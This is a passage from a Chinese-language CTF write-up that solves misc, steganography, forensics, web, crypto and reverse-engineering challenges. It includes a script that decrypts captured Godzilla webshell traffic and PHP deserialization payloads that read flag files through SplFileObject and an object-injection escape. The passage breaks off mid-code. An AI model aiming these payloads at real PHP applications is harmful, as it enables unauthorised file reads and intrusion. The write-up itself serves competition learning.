<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string1 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>  <span class="comment">#标准base64编码表</span></span><br><span class="line"></span><br><span class="line">strings = <span class="string">&quot;ivOY50&quot;</span></span><br><span class="line">all_colors = (itertools.permutations(strings, <span class="number">6</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> all_colors:</span><br><span class="line">    tmp = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    string2 = <span class="string">f&#x27;xbQTZqjN8ERuwlzVfUIrPkeHd<span class="subst">&#123;tmp&#125;</span>LK697o2pSsGD+ncgm3CBh/Xy1MF4JAWta&#x27;</span>  <span class="comment"># 换表后base64编码表</span></span><br><span class="line">    encode = <span class="string">&#x27;EvAzEwo6E9RO4qSAHq42E9KvEv5zHDt34GtdHGJaHD7NHG42bwd=&#x27;</span></span><br><span class="line">    decode = base64.b64decode(encode.translate(<span class="built_in">str</span>.maketrans(string1, string2)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(decode) <span class="keyword">and</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(decode):</span><br><span class="line">        <span class="built_in">print</span>(decode)</span><br></pre></td></tr></table></figure></div>

<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">let r = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+=&quot;</span>;</span><br><span class="line">let cars = [<span class="number">25</span>, <span class="number">38</span>, <span class="number">49</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">55</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">12</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">50</span>, <span class="number">12</span>, <span class="number">51</span>, <span class="number">24</span>, <span class="number">51</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">16</span>, <span class="number">52</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">25</span>, <span class="number">38</span>, <span class="number">13</span>, <span class="number">54</span>, <span class="number">4</span>, <span class="number">52</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">55</span>, <span class="number">12</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">51</span>, <span class="number">12</span>, <span class="number">38</span>, <span class="number">16</span>, <span class="number">49</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">8</span>, <span class="number">54</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">12</span>, <span class="number">55</span>, <span class="number">52</span>, <span class="number">63</span>];</span><br><span class="line">let ff = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (var iii = <span class="number">0</span>; iii &lt; cars.length; iii++) &#123;</span><br><span class="line">ff = ff + r[cars[iii]];</span><br><span class="line">&#125;</span><br><span class="line">/*this <span class="keyword">is</span> flag*/</span><br><span class="line">console.log(ff)</span><br></pre></td></tr></table></figure></div>

<p>直接运行 解码base64即可</p>
<h2 id="Stego"><a href="#Stego" class="headerlink" title="Stego"></a>Stego</h2><h3 id="我应该去爱你"><a href="#我应该去爱你" class="headerlink" title="我应该去爱你"></a>我应该去爱你</h3><p>频谱图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/%E7%A7%91%E6%9D%A5%E6%9D%AF10/%E6%88%91%E5%BA%94%E8%AF%A5%E5%8E%BB%E7%88%B1%E4%BD%A0.png"
                      alt="我应该去爱你"
                ></p>
<h3 id="数独"><a href="#数独" class="headerlink" title="数独"></a>数独</h3><p>先填数独，得到4132234132141423</p>
<p>因为是隐写题，考虑有密码的隐写，只有LSB</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:UsersAdministratorDesktopmisc脚本收集cloacked-pixel-master&gt;python2 lsb.py extract C:UsersAdministratorDesktopmisc脚本收集cloacked-pixel-mastershudok.png-stego.png 1.txt 4132234132141423</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/%E7%A7%91%E6%9D%A5%E6%9D%AF10/%E6%95%B0%E7%8B%AC.png"
                      alt="数独"
                ></p>
<h3 id="莫生气"><a href="#莫生气" class="headerlink" title="莫生气"></a>莫生气</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/%E7%A7%91%E6%9D%A5%E6%9D%AF10/%E8%8E%AB%E7%94%9F%E6%B0%94.png"
                      alt="莫生气"
                ></p>
<p>提取出png，补上文件头，然后双图盲水印</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/%E7%A7%91%E6%9D%A5%E6%9D%AF10/%E8%8E%AB%E7%94%9F%E6%B0%942.png"
                      alt="莫生气2"
                ></p>
<h2 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h2><h3 id="金刚大战哥斯拉"><a href="#金刚大战哥斯拉" class="headerlink" title="金刚大战哥斯拉"></a>金刚大战哥斯拉</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/%E7%A7%91%E6%9D%A5%E6%9D%AF10/%E5%93%A5%E6%96%AF%E6%8B%89.png"
                      alt="金刚大战哥斯拉"
                ></p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;DASCTF&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;9c2ffaf6a14493bf&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;fLluZmFmNmExNJEhWBG1b1XhCY%2BtGO2uCp6t3zK69FxYTKJQssNT1y5Cf45Hu3u%2Fivq08xw%2FbzMVDb2iVURKKXEgFjxjZzQ6kQjmUHpg8t9m09mKOdTLyE5V%2B%2Bzw83kQjtK%2Bl9yBKvzGCdNluDokRoC4jvtek8KVLXnlU3K366szlCn4XS%2BxolAu%2FzspbXO1wRZkj15en%2BXvDcX%2BrfySQnxMFJKl2bgedSVozzyNwPBUFxcUX3V2E%2FGyFHezDWxnihBUXutJRvu%2FuHjZwHGhu%2BpybShnSwTgYLjybXZRZC3M%2BmD04BA6ancVF5lirsWZ3gsqB3h9rvKzDvtwG3FoCM6ObODAYOcpOLtSO8xuGMciws40NV81hhXQV7ViZG9At06ypufihH4bSJ0xy1aL1T6WCPL6fcRbCaVn%2F7BYmCuoy3LzMlI3CHA0OXbds4Itwg7X0dQnKp7eiJKtV0MjJAMqAN50O9LVDaJnbQg%2Bgz2iJLLoMSCnR3v%2BbLMZAid5ESm8JoIgZk5BNpVZ5xOdquNNWFz%2BpLOR9W%2Fe%2BhjwxCiwdtfdaQj0QiC18L6TbTSMhl2qQWqZrd97KZDOI4gJ6ar1QWIgDk3D%2BO5oRFYMWRthsKfGFB38Hcn%2BqMDyOLrLqBFJXaw0Yv1YQaHyn9ycRJ7DEoWfsdCyOuH5HtW4MNp2Y72ptdqCI4RHgZryK142ucH2BCmN0oxVZr4zcMISfKEwXmyzwrX27r%2BZoYUqTwN%2FJ2NCE1%2FWNgPkChD08LLZKbS0dzIlZ3xFL2h7kbP%2FOHn8ceocxTV3q%2F%2BPjOrpsORuwQOj6pMoYB%2FSD5rUGN0KGeerrZQhUaw2u5%2FiZMj9rnlFiF3gyOtb3mTLt%2FN09poaFr9TidOFisTtU%2FnryDLT2GnIfIveQwKcwliQhVGLvWiEgIweDe3OmDeFYT8U68LU09%2BMrxGD2lYdh4tlvx9h2IttzPAc3yZna5tP%2BiZJJruPGgY40GVc9p%2Fw1%2Bixk%2F68RoLtOscCL%2FERCXz22P8xWmk9utDwSA8dyeCgj3hBQsr24nSbWJFu0%2FOSM5dOK00yD%2F8GE4fyxQ7U0IVVZ1rjdccA44j0Tt7ArMzs4d1a6k3SK2GiKM2X3dqqysh9oJ96r2iJA2R0jHvYwbKTSSLyhDT%2BpZc5Hl%2Fp6e6L5wTKuRZnhKxIDqpzpw%2BwQe6pVq0BuI5FoXQ%2F3mPydT2nkEjcLnLaxBDoVQSUd6Ba92MYcesUpZ13yAAgi%2F79ZKgithRVuwhrTCtNXAp5j6p7%2BBJdzJGV%2Bl2s33UnBjVeKqrAUATX9yY7NIql2E4SOWp4loycxh2nwR3Qe9Zi%2BKBaSmBHVy5liSgUFGOlmsWgM%2FstzXc%2F9SNQyUXALbOxa7s17A%2BDOkgUGLIBM7M6Va0Aa8A2xTnyr0SHwyQpUjE5E1x1t24X4MSADqqMIkQSEHPkgttSbALFUOd32Gko8djwakoi7rmXWAEKojSlDZffyPLwMJQjI%2B5%2FiXFfSasJP1zCbr5nl%2FKFBcomDDFy8gnLMG2zwvLRIrfDquVIhlTgF6Giq4JqWmI9ZSJG8ATh2y%2F9uXExyhdQ33b4O%2B4a9OJv%2F1MWz%2BYQqCLu9DhObYTQQThBtUcxAyF3hOD9B1Q0DWQNPu7UDMuLX57ThBw8CulWsahG7QBGOamGf23KVji%2FaQdKeXYGQohkA1oN%2FSOleQWuIJvSk1KrBDtQRU6AWG6WNqnl33Z%2B0cgBYUcg8noLHMByMkRefpLMqm%2BGH2zrdGpNgEcaCzk5ulYd9pHMdiYDfTp3sFjdsR%2FxplFSP4VfnbWpF7WsiT7WGZoPXtv%2F4gWI60ftEnJ1peYtXUlLDuv2tYt2wmpafCClt1Y0tfB51iBFGhUy7Bw%2FdbjtVxZJHB8FvsEzEGj5BWp45LAGFxpOUsKuUVdioTfyjp01%2F%2FIAsu%2FUG%2FxSpHdfR5TlGRLw0WNef7CnYxLURPTbp0ZF9MglFQGkN58Iq7RR4EFt4s4fP32AmuTUgyz7WNgqv0nswP0mPzMHiZwxBSIZTitjQ5QYbd1BlOX1cAM0TZRE2bOiDQnPjhvEC3jEp9L3ktZ1A%2BVcuXnAhInoy4Dq1%2F0%2FO5KITcyi0NR1ftNMsjzMwUZETqEcCyxr1d23lSNBEFTf4A4FJaCIfcvD0tbHoceynhSdHkRJBiUu8DULyBdcTeFFRq9jA3jwpjrbBmvYfvSBoNqYKbbPq2tErzqOA2fiPYHJkMiAPVsamUIDG4%2FzMD4SqKu6Uoj836CsY%2Fz7znvX5zh6LzB7vPoL8QUGmEd5E0SXk4vKieQkHX4vlQM%2FToQKpQRkdaMrOIs0LQFIp0D4vvEhdwJ7eK%2FmClCgCOPEpU%2F3zJhVfIZfUHgDrkUK4HOfT4piF4STR7SZCleaGDwHUkYRiLWNGrEiiNqwNPJhQ63gStGcBVIYFk%2B3F1neK32xH506xzsqjhFJnDHAbMPC47x6hXmMsm%2BTMBQNfgYyzmDyxERG3o9IuLB%2B3vzTJfaLv9bZ4aNTef%2BMwQDLojDSIiEK%2FDvw%2BuOHt5%2Fwk7cNiXWBhKCjULlR8Daukh7MFlCklEs3srvkifaW4VbF85SckpUhIjOTVTYZ4EgK1VYQ%2BK52O7kKt%2BT2kOkLDDE5JiDXApezQtbnw5yPM8WDh5c1DTaRqLsWxUTPWtVlcbzyge5D4VYWXJ0ICPpVfbeEQXutk0tMKBfY0q20%2Bo8CD6oHnm3wy5ELMeLsmXrspAmhwk2wr8d64CHizraARwvNAAX71VCPIUukAvgtEBblKi9EsFr4Or6s%2Fz1RtnxlaufSdlTCCwWTAe%2FeBK%2FKdehF4gIQ91hCWyrI6jJchH%2F5VA0sXxqVe1sBsZulTMJJJo3VZsFutboAetPCdcmEzqqIYUEuSuJf%2F5tXJm5hujq6EJ6rZbBXqnCeLDVWyhhZvy4kL9jKcF2Hp9ItvRBHP6hI%2FAEzBH%2B89XwS07WJsmlYkiQmHDYavnLbbm8sEAbGwbxCbTUJU7qKgTZff%2BWEBuQ%2BTg4mRab4%2B8SpRklCHU3QCeS1nIHPuJrdyOwMMGQ%2B%2BWEG0hDsiReJbkcG9f9mORbZpLegR5HDbiT0oYJG6GcvKxTNS6voIrE94nva0%2FeQvEgokgbBQQQoejcj1h7oStaWk5OdeWhBJaAgnFmtfGW6lyA0OQ%3D%3D&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">gzdecode</span>(<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$data</span>)),<span class="variable">$key</span>)));</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/%E7%A7%91%E6%9D%A5%E6%9D%AF10/%E5%93%A5%E6%96%AF%E6%8B%892.png"
                      alt="金刚大战哥斯拉2"
                ></p>
<h3 id="啊吧啊吧的数据包"><a href="#啊吧啊吧的数据包" class="headerlink" title="啊吧啊吧的数据包"></a>啊吧啊吧的数据包</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/%E7%A7%91%E6%9D%A5%E6%9D%AF10/%E9%98%BF%E5%B7%B4%E5%B7%B4.png"
                      alt="阿巴巴"
                ></p>
<p>命令的时间盲注，写脚本有点麻烦</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/%E7%A7%91%E6%9D%A5%E6%9D%AF10/%E9%98%BF%E5%B7%B4%E5%B7%B42.png"
                      alt="阿巴巴2"
                ></p>
<p>不如简单处理一下，然后手撕</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/%E7%A7%91%E6%9D%A5%E6%9D%AF10/%E9%98%BF%E5%B7%B4%E5%B7%B43.png"
                      alt="阿巴巴3"
                ></p>
<p>flag{3563bdb1a59309e1a4e93b65152bfbba}</p>
<h3 id="小刘的硬盘"><a href="#小刘的硬盘" class="headerlink" title="小刘的硬盘"></a>小刘的硬盘</h3><p>取证大师提出个压缩包，备注是名字+生日，掩码爆破</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/%E7%A7%91%E6%9D%A5%E6%9D%AF10/%E5%B0%8F%E5%88%98.png"
                      alt="小刘"
                ></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="uns"><a href="#uns" class="headerlink" title="uns"></a>uns</h3><p>payload：</p>
<p>第一层</p>
<p>大写S用十六进制进行绕过，利用数组传参，原生类读文件</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">test=O:4:&quot;Test&quot;:1:&#123;s:5:&quot;check&quot;;S:6:&quot;73dnisc&quot;;&#125;&amp;class[/flag]=SplFileObject</span><br></pre></td></tr></table></figure></div>

<p>第二层</p>
<p>反序列化逃逸</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=******************************&amp;b=&quot;;s:5:&quot;bbbb2&quot;;O:3:&quot;Mid&quot;:1:&#123;s:3:&quot;mid&quot;;O:4:&quot;High&quot;:1:&#123;s:4:&quot;high&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h3><p>变异凯撒</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">enc = &quot;ipfm\x82Kj]p~l?\x82ogw\x85mt[K\x8br\x97&quot;</span><br><span class="line">k = 3</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in enc:</span><br><span class="line">    flag += chr(ord(i) - k)</span><br><span class="line">    k += 1</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></div>

<h3 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h3><p>中国剩余定理+coppersmith</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">c=<span class="number">16054555662735670936425135698617301522625617352711974775378018085049483927967003651984471094732778961987450487617897728621852600854484345808663403696158512839904349191158022682563472901550087364635161575687912122526167493016086640630984613666435283288866353681947903590213628040144325577647998437848946344633931992937352271399463078785332327186730871953277243410407484552901470691555490488556712819559438892801124838585002715833795502134862884856111394708824371654105577036165303992624642434847390330091288622115829512503199938437184013818346991753782044986977442761410847328002370819763626424000475687615269970113178</span></span><br><span class="line">n=<span class="number">23074300182218382842779838577755109134388231150042184365611196591882774842971145020868462509225850035185591216330538437377664511529214453059884932721754946462163672971091954096063580346591058058915705177143170741930264725419790244574761160599364476900422586525460981150535489695841064696962982002670256800489965431894477338710190086446895596651842542202922745215496409772520899845435760416159521297579623368414347408762466625792978844177386450506030983725234361868749543549687052221290158286459657697717436496769811720945731143244062649181615815707417418929020541958587698982776940334577355474770096580775243142909913</span></span><br><span class="line">Divisor=[<span class="number">205329935991133380974880368934928321273</span>, <span class="number">274334866497850560640212079966358515253</span>, <span class="number">264739757264805981824344553014559883169</span>, <span class="number">314495359937742744429284762852853819407</span>, <span class="number">197513216256198287285250395397676269263</span>, <span class="number">194633662721082002304170457215979299327</span>, <span class="number">320085578355926571635267449373645191637</span>, <span class="number">310701821184698431287158634968374845899</span>, <span class="number">198238777199475748910296932106553167589</span>, <span class="number">292201037703513010563101692415826269513</span>, <span class="number">332238634715339876614712914152080415649</span>, <span class="number">334257376383174624240445796871873866383</span>]</span><br><span class="line">Result=[<span class="number">108968951841202413783269876008807200083</span>, <span class="number">29053101048844108651205043858001307413</span>, <span class="number">243503157837867321277650314313173163504</span>, <span class="number">160933173053376016589301282259056101279</span>, <span class="number">53063624128824890885455759542416407733</span>, <span class="number">34980025050049118752362228613379556692</span>, <span class="number">132553045879744579114934351230906284133</span>, <span class="number">160998336275894702559853722723725889989</span>, <span class="number">87211131829406574118795685545402094661</span>, <span class="number">36445723649693757315689763759472880579</span>, <span class="number">11133325919940126818459098315213891415</span>, <span class="number">1404668567372986395904813351317555162</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">basic_CRT</span>(<span class="params">ai,mi</span>):</span><br><span class="line">    <span class="keyword">assert</span> reduce(gmpy2.gcd,mi) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ai) == <span class="built_in">len</span>(mi)</span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x,y:x * y,mi)</span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> a,m <span class="keyword">in</span> <span class="built_in">zip</span>(ai,mi):</span><br><span class="line">        t = N // m</span><br><span class="line">        ans += a * t * gmpy2.invert(t,m)</span><br><span class="line">    <span class="keyword">return</span> ans % N,N</span><br><span class="line">result = basic_CRT(Result,Divisor)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>

<p>先通过CRT求出p_2</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">p_high=<span class="number">157397749849472741302651922559110947585741898399548366071672772026799823577871183957882637829089669634665699886533302712057712796808672023827078956556745522749244570015492585747076324258912525658578733402979835176037760966294532155059241756382643278063578661030876735794467422919824463419065126688059515994112</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p_high</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^<span class="number">128</span>, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="keyword">if</span> roots:</span><br><span class="line"> p = p_high+<span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>+<span class="built_in">str</span>(n))</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>+<span class="built_in">str</span>(p))</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>+<span class="built_in">str</span>(n//p))</span><br></pre></td></tr></table></figure></div>

<p>然后再梭个coppersmith</p>
<p>最后正常解RSA就是了</p>
<p>完整脚本：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">c=<span class="number">16054555662735670936425135698617301522625617352711974775378018085049483927967003651984471094732778961987450487617897728621852600854484345808663403696158512839904349191158022682563472901550087364635161575687912122526167493016086640630984613666435283288866353681947903590213628040144325577647998437848946344633931992937352271399463078785332327186730871953277243410407484552901470691555490488556712819559438892801124838585002715833795502134862884856111394708824371654105577036165303992624642434847390330091288622115829512503199938437184013818346991753782044986977442761410847328002370819763626424000475687615269970113178</span></span><br><span class="line">n=<span class="number">23074300182218382842779838577755109134388231150042184365611196591882774842971145020868462509225850035185591216330538437377664511529214453059884932721754946462163672971091954096063580346591058058915705177143170741930264725419790244574761160599364476900422586525460981150535489695841064696962982002670256800489965431894477338710190086446895596651842542202922745215496409772520899845435760416159521297579623368414347408762466625792978844177386450506030983725234361868749543549687052221290158286459657697717436496769811720945731143244062649181615815707417418929020541958587698982776940334577355474770096580775243142909913</span></span><br><span class="line">Divisor=[<span class="number">205329935991133380974880368934928321273</span>, <span class="number">274334866497850560640212079966358515253</span>, <span class="number">264739757264805981824344553014559883169</span>, <span class="number">314495359937742744429284762852853819407</span>, <span class="number">197513216256198287285250395397676269263</span>, <span class="number">194633662721082002304170457215979299327</span>, <span class="number">320085578355926571635267449373645191637</span>, <span class="number">310701821184698431287158634968374845899</span>, <span class="number">198238777199475748910296932106553167589</span>, <span class="number">292201037703513010563101692415826269513</span>, <span class="number">332238634715339876614712914152080415649</span>, <span class="number">334257376383174624240445796871873866383</span>]</span><br><span class="line">Result=[<span class="number">108968951841202413783269876008807200083</span>, <span class="number">29053101048844108651205043858001307413</span>, <span class="number">243503157837867321277650314313173163504</span>, <span class="number">160933173053376016589301282259056101279</span>, <span class="number">53063624128824890885455759542416407733</span>, <span class="number">34980025050049118752362228613379556692</span>, <span class="number">132553045879744579114934351230906284133</span>, <span class="number">160998336275894702559853722723725889989</span>, <span class="number">87211131829406574118795685545402094661</span>, <span class="number">36445723649693757315689763759472880579</span>, <span class="number">11133325919940126818459098315213891415</span>, <span class="number">1404668567372986395904813351317555162</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">basic_CRT</span>(<span class="params">ai,mi</span>):</span><br><span class="line">    <span class="keyword">assert</span> reduce(gmpy2.gcd,mi) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ai) == <span class="built_in">len</span>(mi)</span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x,y:x * y,mi)</span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> a,m <span class="keyword">in</span> <span class="built_in">zip</span>(ai,mi):</span><br><span class="line">        t = N // m</span><br><span class="line">        ans += a * t * gmpy2.invert(t,m)</span><br><span class="line">    <span class="keyword">return</span> ans % N,N</span><br><span class="line">result = basic_CRT(Result,Divisor)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">p_high=<span class="number">157397749849472741302651922559110947585741898399548366071672772026799823577871183957882637829089669634665699886533302712057712796808672023827078956556745522749244570015492585747076324258912525658578733402979835176037760966294532155059241756382643278063578661030876735794467422919824463419065126688059515994112</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p_high</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^<span class="number">128</span>, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="keyword">if</span> roots:</span><br><span class="line"> p = p_high+<span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>+<span class="built_in">str</span>(n))</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>+<span class="built_in">str</span>(p))</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>+<span class="built_in">str</span>(n//p))</span><br><span class="line">n=<span class="number">23074300182218382842779838577755109134388231150042184365611196591882774842971145020868462509225850035185591216330538437377664511529214453059884932721754946462163672971091954096063580346591058058915705177143170741930264725419790244574761160599364476900422586525460981150535489695841064696962982002670256800489965431894477338710190086446895596651842542202922745215496409772520899845435760416159521297579623368414347408762466625792978844177386450506030983725234361868749543549687052221290158286459657697717436496769811720945731143244062649181615815707417418929020541958587698982776940334577355474770096580775243142909913</span></span><br><span class="line">p=<span class="number">157397749849472741302651922559110947585741898399548366071672772026799823577871183957882637829089669634665699886533302712057712796808672023827078956556745522749244570015492585747076324258912525658578733402979835176037760966294532155059241756382643278063578661030876735794708282102407491782299777228899079176117</span></span><br><span class="line">q=<span class="number">146598666145389487374076474702380241089893944436923994466470555513748278755568038863819188404588602962888679358728628069490879689376996830110571995521814075973422513105805715524894550773219606972944401957227665252279176873209924236114228003156706532596699592716796867748104565680326123749660658940264843181589</span></span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=invert(e,phi)</span><br><span class="line">m=powmod(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;2233747d3bf06f070048e80300dac75f&#125;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="人生模拟"><a href="#人生模拟" class="headerlink" title="人生模拟"></a>人生模拟</h3><p>找到加密逻辑，跟着跑一边就是了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/%E7%A7%91%E6%9D%A5%E6%9D%AF10/%E4%BA%BA%E7%94%9F%E6%A8%A1%E6%8B%9F.png"
                      alt="人生模拟"
                ></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">v15=[<span class="number">0</span>]*<span class="number">38</span></span><br><span class="line">v15[<span class="number">0</span>] = <span class="number">432</span>;</span><br><span class="line">v15[<span class="number">1</span>] = <span class="number">408</span>;</span><br><span class="line">v15[<span class="number">2</span>] = <span class="number">429</span>;</span><br><span class="line">v15[<span class="number">3</span>] = <span class="number">438</span>;</span><br><span class="line">v15[<span class="number">4</span>] = <span class="number">452</span>;</span><br><span class="line">v15[<span class="number">5</span>] = <span class="number">246</span>;</span><br><span class="line">v15[<span class="number">6</span>] = <span class="number">243</span>;</span><br><span class="line">v15[<span class="number">7</span>] = <span class="number">417</span>;</span><br><span class="line">v15[<span class="number">8</span>] = <span class="number">423</span>;</span><br><span class="line">v15[<span class="number">9</span>] = <span class="number">444</span>;</span><br><span class="line">v15[<span class="number">10</span>] = <span class="number">240</span>;</span><br><span class="line">v15[<span class="number">11</span>] = <span class="number">231</span>;</span><br><span class="line">v15[<span class="number">12</span>] = <span class="number">203</span>;</span><br><span class="line">v15[<span class="number">13</span>] = <span class="number">447</span>;</span><br><span class="line">v15[<span class="number">14</span>] = <span class="number">207</span>;</span><br><span class="line">v15[<span class="number">15</span>] = <span class="number">435</span>;</span><br><span class="line">v15[<span class="number">16</span>] = <span class="number">253</span>;</span><br><span class="line">v15[<span class="number">17</span>] = <span class="number">224</span>;</span><br><span class="line">v15[<span class="number">18</span>] = <span class="number">204</span>;</span><br><span class="line">v15[<span class="number">19</span>] = <span class="number">443</span>;</span><br><span class="line">v15[<span class="number">20</span>] = <span class="number">419</span>;</span><br><span class="line">v15[<span class="number">21</span>] = <span 